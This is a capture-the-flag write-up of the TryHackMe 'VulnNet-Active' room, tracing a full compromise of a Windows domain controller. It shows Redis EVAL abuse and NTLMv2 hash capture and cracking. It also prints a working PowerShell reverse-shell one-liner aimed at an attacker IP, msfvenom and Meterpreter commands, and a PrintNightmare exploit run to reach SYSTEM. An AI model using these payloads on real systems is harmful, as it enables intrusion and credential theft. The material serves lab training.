# VulnNet-Active

Link to the room: https://tryhackme.com/room/vulnnetactive

## Let's start !! 

First, we set an IP variable 

````````
export IP=10.10.16.131
````````

### Rustscan Scan 

I used rustscan because I like its style and it instantly gives a response after discovering an open port. The drawback is that we cannot scan it for UDP.

````````
rustscan -a $IP -- -A -sC -sV -oN nmap.txt
````````

````````
----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.16.131:53
Open 10.10.16.131:135
Open 10.10.16.131:139
Open 10.10.16.131:445
Open 10.10.16.131:464
Open 10.10.16.131:6379
Open 10.10.16.131:9389
Open 10.10.16.131:49665
Open 10.10.16.131:49668
Open 10.10.16.131:49669
Open 10.10.16.131:49670
Open 10.10.16.131:49673
Open 10.10.16.131:49701
Open 10.10.16.131:49722
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 23:15 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:15
Completed NSE at 23:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:15
Completed NSE at 23:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:15
Completed NSE at 23:15, 0.00s elapsed
Initiating Ping Scan at 23:15
Scanning 10.10.16.131 [4 ports]
Completed Ping Scan at 23:15, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:15
Completed Parallel DNS resolution of 1 host. at 23:15, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 23:15
Scanning 10.10.16.131 [14 ports]
Discovered open port 445/tcp on 10.10.16.131
Discovered open port 135/tcp on 10.10.16.131
Discovered open port 49669/tcp on 10.10.16.131
Discovered open port 139/tcp on 10.10.16.131
Discovered open port 49668/tcp on 10.10.16.131
Discovered open port 53/tcp on 10.10.16.131
Discovered open port 464/tcp on 10.10.16.131
Discovered open port 49670/tcp on 10.10.16.131
Discovered open port 49665/tcp on 10.10.16.131
Discovered open port 9389/tcp on 10.10.16.131
Discovered open port 49701/tcp on 10.10.16.131
Discovered open port 6379/tcp on 10.10.16.131
Discovered open port 49722/tcp on 10.10.16.131
Discovered open port 49673/tcp on 10.10.16.131
Completed SYN Stealth Scan at 23:15, 0.47s elapsed (14 total ports)
Initiating Service scan at 23:15
Scanning 14 services on 10.10.16.131
Service scan Timing: About 57.14% done; ETC: 23:17 (0:00:45 remaining)
Completed Service scan at 23:18, 151.14s elapsed (14 services on 1 host)
Initiating OS detection (try #1) against 10.10.16.131
Retrying OS detection (try #2) against 10.10.16.131
Initiating Traceroute at 23:18
Completed Traceroute at 23:18, 0.27s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 23:18
Completed Parallel DNS resolution of 2 hosts. at 23:18, 0.02s elapsed
DNS resolution of 2 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.16.131.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:18
NSE Timing: About 99.95% done; ETC: 23:18 (0:00:00 remaining)
Completed NSE at 23:19, 40.07s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:19
Completed NSE at 23:19, 1.26s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:19
Completed NSE at 23:19, 0.00s elapsed
Nmap scan report for 10.10.16.131
Host is up, received echo-reply ttl 127 (0.26s latency).
Scanned at 2022-03-12 23:15:42 IST for 201s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain?       syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
6379/tcp  open  redis         syn-ack ttl 127 Redis key-value store
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49701/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49722/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=3/12%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=622CDD0F%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10B%TI=I%II=I%SS=S%TS=U)
OPS(O1=M505NW8NNS%O2=M505NW8NNS%O3=M505NW8%O4=M505NW8NNS%O5=M505NW8NNS%O6=M505NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M505NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-03-12T17:48:25
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 17460/tcp): CLEAN (Timeout)
|   Check 2 (port 12920/tcp): CLEAN (Timeout)
|   Check 3 (port 48172/udp): CLEAN (Timeout)
|   Check 4 (port 25607/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   233.75 ms 10.8.0.1
2   266.44 ms 10.10.16.131

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:19
Completed NSE at 23:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:19
Completed NSE at 23:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:19
Completed NSE at 23:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.45 seconds
           Raw packets sent: 104 (8.268KB) | Rcvd: 47 (2.764KB)

````````
As we saw on our scan result we found Redis key-value store is running on
(6379).so I search it on google and found it has some functions that we can abuse. let's begin we auth with the service.

### Redis key-value store (auth)

````````
redis-cli -h $IP
````````

````````
10.10.16.131:6379> INFO
# Server
redis_version:2.8.2402
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:b2a45a9622ff23b7
redis_mode:standalone
os:Windows  
arch_bits:64
multiplexing_api:winsock_IOCP
process_id:2272
run_id:01792114d783f6bd87171487ee30294391d76768
tcp_port:6379
uptime_in_seconds:1393
uptime_in_days:0
hz:10
lru_clock:2940564
config_file:

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:953072
used_memory_human:930.73K
used_memory_rss:919528
used_memory_peak:977528
used_memory_peak_human:954.62K
used_memory_lua:36864
mem_fragmentation_ratio:0.96
mem_allocator:dlmalloc-2.8

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1647106339
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok

# Stats
total_connections_received:6
total_commands_processed:2
instantaneous_ops_per_sec:0
total_net_input_bytes:67
total_net_output_bytes:0
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0

# Replication
role:master
connected_slaves:0
master_repl_offset:0
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.55
used_cpu_user:1.03
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Keyspace
10.10.16.131:6379> 

````````
We have successfully authenticated with Redis key-value store. Now let us do some enumeration.

### Redis key-value store (enumeration)

````````
10.10.16.131:6379> CONFIG GET *
````````

````````
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "unixsocket"
  8) ""
  9) "logfile"
 10) ""
 11) "pidfile"
 12) "/var/run/redis.pid"
 13) "maxmemory"
 14) "0"
 15) "maxmemory-samples"
 16) "3"
 17) "timeout"
 18) "0"
 19) "tcp-keepalive"
 20) "0"
 21) "auto-aof-rewrite-percentage"
 22) "100"
 23) "auto-aof-rewrite-min-size"
 24) "67108864"
 25) "hash-max-ziplist-entries"
 26) "512"
 27) "hash-max-ziplist-value"
 28) "64"
 29) "list-max-ziplist-entries"
 30) "512"
 31) "list-max-ziplist-value"
 32) "64"
 33) "set-max-intset-entries"
 34) "512"
 35) "zset-max-ziplist-entries"
 36) "128"
 37) "zset-max-ziplist-value"
 38) "64"
 39) "hll-sparse-max-bytes"
 40) "3000"
 41) "lua-time-limit"
 42) "5000"
 43) "slowlog-log-slower-than"
 44) "10000"
 45) "latency-monitor-threshold"
 46) "0"
 47) "slowlog-max-len"
 48) "128"
 49) "port"
 50) "6379"
 51) "tcp-backlog"
 52) "511"
 53) "databases"
 54) "16"
 55) "repl-ping-slave-period"
 56) "10"
 57) "repl-timeout"
 58) "60"
 59) "repl-backlog-size"
 60) "1048576"
 61) "repl-backlog-ttl"
 62) "3600"
 63) "maxclients"
 64) "10000"
 65) "watchdog-period"
 66) "0"
 67) "slave-priority"
 68) "100"
 69) "min-slaves-to-write"
 70) "0"
 71) "min-slaves-max-lag"
 72) "10"
 73) "hz"
 74) "10"
 75) "repl-diskless-sync-delay"
 76) "5"
 77) "no-appendfsync-on-rewrite"
 78) "no"
 79) "slave-serve-stale-data"
 80) "yes"
 81) "slave-read-only"
 82) "yes"
 83) "stop-writes-on-bgsave-error"
 84) "yes"
 85) "daemonize"
 86) "no"
 87) "rdbcompression"
 88) "yes"
 89) "rdbchecksum"
 90) "yes"
 91) "activerehashing"
 92) "yes"
 93) "repl-disable-tcp-nodelay"
 94) "no"
 95) "repl-diskless-sync"
 96) "no"
 97) "aof-rewrite-incremental-fsync"
 98) "yes"
 99) "aof-load-truncated"
100) "yes"
101) "appendonly"
102) "no"
103) "dir"
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
105) "maxmemory-policy"
106) "volatile-lru"
107) "appendfsync"
108) "everysec"
109) "save"
110) "jd 3600 jd 300 jd 60"
111) "loglevel"
112) "notice"
113) "client-output-buffer-limit"
114) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
115) "unixsocketperm"
116) "0"
117) "slaveof"
118) ""
119) "notify-keyspace-events"
120) ""
121) "bind"
122) ""
10.10.16.131:6379> 

````````
we see on line 104 " C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402 " there is and user called enterprise-security. Lets try to abuse EVAL function for getting the user.txt.


### Redis key-value store (abuse EVAL)

````````
10.10.16.131:6379> EVAL "dofile('C:/Users/enterprise-security/Desktop/user.txt')" 0
````````

````````
(error) ERR Error running script (call to f_eebcad8707d6acaa5a1f5511b5d88676a90438d6): @user_script:1: C:/Users/enterprise-security/Desktop/user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e' 
10.10.16.131:6379> 

````````
So It is proved we have some kind of RCE. Let's try to Capture NTLM V2 HASH with the responder.

### Capturing NTLM V2 HASH

````````
responder -I tun0 
````````

````````
                                        __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.8.59.75]
    Responder IPv6             [fe80::22cc:882c:8334:d6e5]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-W4IHDGH6WR4]
    Responder Domain Name      [GPAN.LOCAL]
    Responder DCE-RPC Port     [46975]

[+] Listening for events...

````````
## Now we use "EVAL" to instruct it to connect back to our target machine.

````````
10.10.16.131:6379> EVAL "dofile('//YOURIP/abc/') 0
````````

## We captured a hash!

````````
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.16.131
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:{REDACTED}
[*] Skipping previously captured hash for VULNNET\enterprise-security

````````
Let's add that hash in the hash.txt file.

## we need to find what kind of hash.

we can use the name-the-hash tool by own bee-san!.

````````	
nth --file hash.txt
````````

````````
 _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

enterprise-security::VULNNET:464fe0a978697980:{REDACTED}

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2

````````

## Cracking the hash.

````````
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
````````

````````
hashcat (v6.2.5) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-10870H CPU @ 2.20GHz, 2904/5873 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ENTERPRISE-SECURITY::VULNNET:464fe0a978697980:{REDACTED}:***************
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ENTERPRISE-SECURITY::VULNNET:464fe0a978697980:7d773...000000
Time.Started.....: Sat Mar 12 23:56:28 2022, (2 secs)
Time.Estimated...: Sat Mar 12 23:56:30 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1608.7 kH/s (0.76ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4014080/14344385 (27.98%)
Rejected.........: 0/4014080 (0.00%)
Restore.Point....: 4012032/14344385 (27.97%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: sandovalbravo -> sand418
Hardware.Mon.#1..: Util: 56%

Started: Sat Mar 12 23:56:12 2022
Stopped: Sat Mar 12 23:56:32 2022

````````

## Smb Enumeration 

````````
smbclient -L \\\\$IP\\ -U enterprise-security
````````

````````
Enter WORKGROUP\enterprise-security's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Enterprise-Share Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.242.198 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

````````
Let's check out the Enterprise-Share share.

````````
smbclient  \\\\$IP\\Enterprise-Share -U enterprise-security
````````

````````
Enter WORKGROUP\enterprise-security's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Mar 13 00:05:18 2022
  ..                                  D        0  Sun Mar 13 00:05:18 2022
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 06:03:18 2021

		9466623 blocks of size 4096. 4931345 blocks available
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> 

````````
We found that PurgeIrrelevantData_1826.ps1 is on autorun. We can overwrite the file with our PowerShell reverse shell and gain a reverse shell connection.

## PowerShell reverse shell payload.

````````
$client = New-Object System.Net.Sockets.TCPClient('Attcker_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

````````
We add this payload in PurgeIrrelevantData_1826.ps1 and upload it on the SMB server for gaining shell access.

### Shell Access

````````
nc -nvlp 1234
````````

````````
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.242.198.
Ncat: Connection from 10.10.242.198:49862.

^LPS C:\Users\enterprise-security\Downloads> ls


    Directory: C:\Users\enterprise-security\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/23/2021   2:29 PM                nssm-2.24-101-g897c7ad                                                
d-----        2/26/2021  12:14 PM                Redis-x64-2.8.2402                                                    
-a----        2/26/2021  10:37 AM            143 startup.bat                                                           


PS C:\Users\enterprise-security\Downloads> whoami
vulnnet\enterprise-security
PS C:\Users\enterprise-security\Downloads> systeminfo

Host Name:                 VULNNET-BC3TCK1
OS Name:                   Microsoft Windows Server 2019 Datacenter Evaluation
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00431-20000-00000-AA463
Original Install Date:     2/22/2021, 11:43:53 AM
System Boot Time:          3/12/2022, 10:28:36 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     512 MB
Available Physical Memory: 10 MB
Virtual Memory: Max Size:  1,536 MB
Virtual Memory: Available: 357 MB
Virtual Memory: In Use:    1,179 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    vulnnet.local
Logon Server:              N/A
Hotfix(s):                 7 Hotfix(s) Installed.
                           [01]: KB4601558
                           [02]: KB4512577
                           [03]: KB4535680
                           [04]: KB4577586
                           [05]: KB4580325
                           [06]: KB4601393
                           [07]: KB4601345
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.242.198
                                 [02]: fe80::5825:3d52:e6ee:5770
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
PS C:\Users\enterprise-security\Downloads> 

````````
It is Microsoft Windows Server 2019. we know it is vulnerable to PrintNightMare AKA CVE-2021-34527, CVE-2021-1675.

## Reference:- https://github.com/cube0x0/CVE-2021-1675

### Exploiting PrintNightMare (CVE-2021-34527, CVE-2021-1675)

we create a dll payload with Metasploit. which is required to perform the exploit.

````````
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={Attcker_IP} LPORT={PORT} -f dll > msf.dll
````````

Now we will set up a meterpreter listener for facilitating the reverse connection.

````````
msfconsole
````````

````````
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST {Attcker_IP}
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT {PORT}
LPORT => 6666
msf6 exploit(multi/handler) > options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     6666             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

````````
we set up a samba share with anonymous login. This is required for hosting the dll file.

````````
smbserver.py share `pwd` -smb2support 
````````

````````
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

````````
Now we will run the exploit and gain access to this machine.

````````
python3 CVE-2021-1675.py VULNNET/enterprise-security:***************@{Target_IP}  '\\{Your_IP}\share\msf.dll'
````````

````````
[*] Connecting to ncacn_np:10.10.242.198[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.8.59.75\share\msf.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0

````````

### Successfully get a reverse shell connection

````````
[*] Started reverse TCP handler on 10.8.59.75:6666 
[*] Sending stage (200262 bytes) to 10.10.242.198
[*] Meterpreter session 1 opened (10.8.59.75:6666 -> 10.10.242.198:49961 ) at 2022-03-13 00:34:33 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

````````

### Getting system.txt

````````
meterpreter > pwd
C:\Windows\system32
meterpreter > cd C:Users\Administrator\Desktop
meterpreter > cat system.txt 
THM{********************************}
meterpreter > 

````````

- Done;









